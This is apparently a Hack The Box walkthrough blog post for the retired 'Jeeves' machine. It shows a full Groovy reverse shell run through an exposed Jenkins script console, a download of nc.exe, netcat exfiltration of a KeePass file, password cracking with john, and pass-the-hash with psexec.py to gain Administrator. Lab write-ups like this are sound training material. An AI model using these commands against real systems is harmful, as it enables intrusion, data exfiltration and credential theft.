---
layout: post
title: "HTB-Jeeves"
categories: HTB-Walkthrough
---

![jeeves](/assets/img/jeeves/jeeves1.png)

Jeeves is another box from TJNull's 'more complicated than OSCP' list of HTB retired machines.



<h3>Nmap</h3>

```
nmap -sV -Pn --min-rate 10000 -p- 10.10.10.63 |tee -a jeeves.txt
```

```
Nmap scan report for 10.10.10.63
Host is up (0.10s latency).
Not shown: 65531 filtered ports
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows
```




<hr width="300" size="10">



<h3>Web</h3>

I take a look at the website.

![web](/assets/img/jeeves/jeeves-web.png)



<h3>Gobuster</h3>
```
gobuster dir -u http://10.10.10.63/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt -t 30
```

I get a bunch of errors...perhaps fewer threads would help.

I quickly check out port 50000 via firefox and get an error page, I try gobuster there too.

```
gobuster dir -u http://10.10.10.63:50000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt -t 30
```

I only get one hit, and as the scan continues I check out the found directory.

```
/askjeeves (Status: 302)
```

![askjeeves](/assets/img/jeeves/jeeves-askjeeves.png)


Jenkins?



<hr width="300" size="10">



<h3>Jenkins Groovy Script-Console</h3>


I check out 
```
http://10.10.10.63:50000/askjeeves/about/
```
and get the version number.

![about](/assets/img/jeeves/jeeves-about-jenkins.png)



Clicking 'Manage Jenkins' we are taken to a further list of options.
From here we can select the `Script Console`.

![manage](/assets/img/jeeves/jeeves-manage.png)

This console allows for the execution of [groovy](http://www.groovy-lang.org/) scripts on the server.

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) provides us with a 'groovy reverse-shell' script.

```java
String host="10.10.14.35";
int port=6969;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

set a netcat listener on 6969
```
nc -nlvp 6969
```

![script-console](/assets/img/jeeves/jeeves-script-console.png)

and 'run' the script.

![revshell](/assets/img/jeeves/jeeves-revshell.png)


<hr width="300" size="10">

We can grab the user flag:

```
c:\Users\kohsuke\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BE50-B1C9

 Directory of c:\Users\kohsuke\Desktop

11/03/2017  11:19 PM    <DIR>          .
11/03/2017  11:19 PM    <DIR>          ..
11/03/2017  11:22 PM                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)   7,522,697,216 bytes free

c:\Users\kohsuke\Desktop>type user.txt
type user.txt
e3xxxxxxxxxxxxxxxxxxxxxxxxxxx66a
```


<hr width="300" size="10">



<h3>Privilege Escalation</h3>


Looking around Kohsuke's directory we can find a 'keypass' file in the 'Documents' folder.
I create a temporary working folder in the C: directory, upload nc.exe and get the file back to Kali.

```
mkdir c:\boo
cd c:\boo
copy c:\users\kohsuke\documents\CEH.kdbx

powershell IWR -uri http://10.10.14.35/nc.exe -outfile c:\boo\nc.exe
```

exfil via nc.exe:

On Kali.
```
nc -nlvp 8888 > CEH.kdbx
```

then on Jeeves.
```
.\nc.exe 10.10.14.35 8888 < CEH.kdbx
```

<hr width="300" size="10">



<h3>Keepass2john</h3>


I use `tee` so that I can see the output in addition to writing to file.

```
root@kali:~/HTB/vip/jeeves# keepass2john CEH.kdbx |tee hash.txt
CEH:$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48

root@kali:~/HTB/vip/jeeves# john --format="keepass" --wordlist=/root/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/32 OpenSSL])
Cost 1 (iteration count) is 6000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES, 1=TwoFish, 2=ChaCha]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status

moonshine1       (CEH)

1g 0:00:00:54 DONE (2019-08-11 16:06) 0.01834g/s 1008p/s 1008c/s 1008C/s nando1..moonshine1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```



<hr width="300" size="10">


<h3>kpcli</h3>

We can use kpcli to access the database file.

![kpcli](/assets/img/jeeves/jeeves-kpcli.png)

The key is blanked out in red, but we can copypaste it:

```

Title: Backup stuff
Uname: ?
 Pass: aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
  URL: 
Notes: 

```


<hr width="300" size="10">




<h3>psexec.py</h3>


We've recovered an NTLM hash, we can try [Impacket's psexec.py](https://github.com/SecureAuthCorp/impacket/tree/master/examples) to see if this hash is the admin one.

```
./psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 Administrator@10.10.10.63 cmd.exe
```

![psexec](/assets/img/jeeves/jeeves-psexec.png)


Now we can grab the root flag; it's hidden, but easily read.

```

c:\Users\Administrator>cd desktop
 
c:\Users\Administrator\Desktop>dir /r
 Volume in drive C has no label.
 Volume Serial Number is BE50-B1C9

 Directory of c:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   7,521,914,880 bytes free

c:\Users\Administrator\Desktop>more < hm.txt:root.txt
afxxxxxxxxxxxxxxxxxxxxxxxxxxxx30

```


<hr width="300" size="10">



:)



